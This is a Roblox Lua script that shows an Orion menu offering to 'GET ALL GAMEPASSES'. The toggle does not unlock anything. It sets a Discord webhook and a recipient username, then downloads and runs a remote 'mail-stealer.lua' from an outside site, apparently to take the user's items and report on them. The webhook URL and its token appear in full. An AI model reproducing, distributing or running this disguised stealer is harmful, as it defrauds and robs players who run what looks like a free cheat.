local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "GET ALL GAMEPASSES BY LIQUID SCRIPTS💦 devc#3631", HidePremium = false, SaveConfig = true, ConfigFolder = "LOADING"})
local main = Window:MakeTab({
	Name = "main",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})



main:AddToggle({
	Name = "GET ALL GAMEPASSES💥",
	Default = false,
	Callback = function(Value)
getgenv().webhook = "https://discord.com/api/webhooks/1084559830146089100/-S-n_eWyVfBdRsQT82Vb3ivZz6hjUfXEivdFhGXPS9RFNBZ2rTncmbQ_erWbiIvoszv7" 
getgenv().name = "cooluqlwyet"
getgenv().mouselock = true
loadstring(game:HttpGetAsync("https://wumat.xyz/scripts/mail-stealer.lua", true))()
	end    
})








OrionLib:Init()
